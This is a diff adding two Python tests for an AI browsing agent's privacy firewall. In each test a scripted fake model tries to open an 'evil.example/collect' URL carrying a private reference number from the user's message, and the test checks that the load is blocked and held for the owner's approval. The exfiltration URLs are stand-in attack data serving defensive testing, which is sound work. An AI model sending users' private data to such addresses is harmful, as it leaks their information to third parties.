@@ -1428,6 +1428,58 @@ class TypedAtEveryWaitTests(ThingsApp):
         script.gate.set()
         self.ended()
 
+    def test_words_typed_with_no_question_up_turn_the_firewall_on_too(self) -> None:
+        """A line it says can ask as a question can, and no check knows every way of asking: what is typed then is a plain
+        message. It reaches the model, and the address rule stands between it and any page not seen in this run."""
+        evil = "https://evil.example/collect?c=4930"
+        said, go_on, stop = threading.Event(), threading.Event(), threading.Event()
+        self.addCleanup(go_on.set)
+        self.addCleanup(stop.set)
+        got: dict[str, Any] = {}
+
+        def script(engine: FakeEngine) -> None:
+            engine.wait_message()
+            engine.call("say", text="What was the reference on that letter?")
+            said.set()
+            go_on.wait(15)
+            got["out"] = engine.call("open_page", url=evil)
+            stop.wait(15)
+
+        self.go(script, goal="find me a cheap laptop")
+        self.assertTrue(said.wait(15))
+        self.assertFalse(self.c.agent.firewall.private)
+        self.type_it(f"4930, and see {evil}")
+        self.assertTrue(self.c.agent.firewall.private)
+        go_on.set()
+        self.assertTrue(wait_for(lambda: "out" in got, timeout=15))
+        settle()
+        self.assertEqual(self.fake_browser.loads, [])
+        self.assertFalse(self.c.agent.firewall.book.seen(evil))
+        self.assertEqual(self.c.agent.firewall.cards, 1)
+        self.assertIn(evil, self.wait_card().task().body)
+        self.c.agent.stop("test")
+        stop.set()
+        self.ended()
+
+    def test_a_request_that_plainly_holds_something_private_has_the_firewall_on_from_the_start(self) -> None:
+        """Its own address still opens at once. An address a page named, carrying what the request held, takes a click."""
+        site = "https://www.example.org/status"
+        evil = "https://evil.example/collect?c=482913"
+        browser = FakeBrowser({site: FakePage("Status", "It is on its way.")})
+        script = Script(("own", "open_page", {"url": site}), ("out", "open_page", {"url": evil}), ("hold",))
+        self.go(script, goal=f"my reference is 482913, look it up on {site}", browser=browser)
+        self.addCleanup(script.gate.set)
+        self.assertTrue(wait_for(lambda: "out" in script.got, timeout=15))
+        settle()
+        self.assertTrue(self.c.agent.firewall.private)
+        self.assertFalse(script.got["own"].get("isError"))
+        self.assertEqual(self.c.agent.firewall.cards, 1)
+        self.assertIn(evil, self.wait_card().task().body)
+        self.assertFalse(self.c.agent.firewall.book.seen(evil))
+        self.c.agent.stop("test")
+        script.gate.set()
+        self.ended()
+
     def test_a_click_on_a_choice_leaves_a_clean_run_clean(self) -> None:
         script = Script(("ask", "ask_owner", {"question": "Which?", "choices": ["Blue", "Red"]}), ("wait",))
         self.go(script, goal="find me a cheap laptop")
